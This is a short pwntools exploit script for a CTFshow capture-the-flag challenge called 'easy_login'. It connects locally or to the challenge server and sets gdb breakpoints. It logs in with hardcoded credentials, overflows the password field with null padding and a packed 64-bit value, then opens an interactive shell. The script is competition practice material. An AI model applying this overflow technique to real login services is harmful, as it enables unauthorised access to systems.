from pwn import *
import sys
remote_addr = ["pwn.challenge.ctf.show",28103]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./easy_login.login")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x1dce)
    b *$rebase(0x1575)
    b *$rebase(0x18f7)
    b *$rebase(0x193e)
    b *$rebase(0x1A0B)
''')
ru(b'-- CTFshow Fool\'s Day terminal based application --') 
sl(b'l')
ru(b'Username: ') 
sl(b'CTFshow-admin')
ru(b'Password: ')
sl(b'CTFshow-password'.ljust(30, b'\x00') + p64(7823732))
ru(b'[y/n]: ') 
sl(b'n')
pause()

sttt = b'Fool Jazz Mingus Hat\x00'

sl(sttt)

shell()
